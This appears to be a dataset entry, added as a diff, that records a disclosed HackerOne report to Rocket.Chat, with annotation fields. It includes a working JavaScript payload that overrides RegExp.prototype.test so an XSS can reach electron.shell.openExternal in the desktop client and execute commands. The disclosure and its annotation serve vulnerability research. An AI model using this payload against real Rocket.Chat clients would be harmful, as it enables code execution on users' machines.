@@ -1,0 +1,50 @@
+{
+  "reported_to": "Rocket.Chat",
+  "reported_by": "fabianfreyer ",
+  "title": "XSS leads to RCE on the RocketChat desktop client.",
+  "content": "\nSummary: It is possible to call electron.shell.openExternal from javascript inside a server webview.\nDescription: The document onclick handler allows executing electron.shell.openExternal by crafting an attacker-controlled link and dispatching a click event on it after overwriting Regex.test.\nReleases Affected:\nRocket.Chat Desktop Client up to version 2.17.9\nSteps To Reproduce (from initial installation to vulnerability):\nHave a XSS vulnerability such as #894462 or #899954.\nCall the following payload (for macos, adjust for other OSes as required):\nCode 485 Bytes\n1(function() {\n2    const payload = `file:///System/Applications/Calculator.app`;\n3    var counter = 0;\n4    var target = document.createElement(`a`);\n5    target.setAttribute(`href`, payload);\n6    document.body.appendChild(target);\n7    var old_test = RegExp.prototype.test;\n8    RegExp.prototype.test = function (s) {\n9        if (s === payload) {\n10            return (++counter > 3);\n11        }\n12        return old_test.call(this, s);\n13    };\n14    target.dispatchEvent(new Event(`click`));\n15})();\nBrowse to a page with the XSS payload.\nUse your freshly opened calculator to calculate the result of 7*191.\nImpact\nAn attacker with a XSS vulnerability in RocketChat such as #894462 or #899954 can call electron.shell.openExternal with arbitrary URLs, leading to arbitrary command execution.\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "OS Command Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1609528500,
+  "report_url": "https://hackerone.com/reports/899964",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Exploit an existing XSS vulnerability in RocketChat (e.g., #894462 or #899954)."
+    ],
+    [
+      2,
+      "Inject and execute the provided JavaScript payload to call electron.shell.openExternal with a malicious URL (e.g., file:///System/Applications/Calculator.app)."
+    ],
+    [
+      3,
+      "Trigger the payload by clicking the crafted link, bypassing security checks via Regex.test manipulation."
+    ],
+    [
+      4,
+      "Observe arbitrary command execution (e.g., calculator app opening)."
+    ]
+  ],
+  "vuln_description": "An XSS vulnerability in RocketChat's desktop client (up to v2.17.9) allows attackers to execute arbitrary commands by exploiting electron.shell.openExternal via a crafted link and Regex.test manipulation, leading to Remote Code Execution (RCE).",
+  "reason": "The attack requires chaining XSS with Electron API abuse and Regex prototype manipulation, involving non-obvious interactions between webview JS execution and desktop environment privileges.",
+  "new_complexity": "HIGH",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": "894462",
+  "authnz_metadata": {
+    "reason": "The vulnerability involves an XSS leading to RCE in the RocketChat desktop client, which is not related to authentication or authorization bypasses. The methodology described focuses on AuthN/AuthZ and IDOR vulnerabilities by testing session and resource access boundaries, which does not apply to this client-side XSS to RCE issue.",
+    "is_detectable": false
+  }
+}
